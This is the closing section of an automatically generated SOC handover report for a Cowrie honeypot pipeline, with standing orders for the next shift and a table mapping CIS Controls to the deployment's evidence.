> **Report grouping:** 74 priority case(s) shown individually · 20 recon entry/entries in table (5 group(s) consolidating 19 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json auto-generated from pipeline.yml each run — tracks all active tools, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-07-02T19:37:33Z_
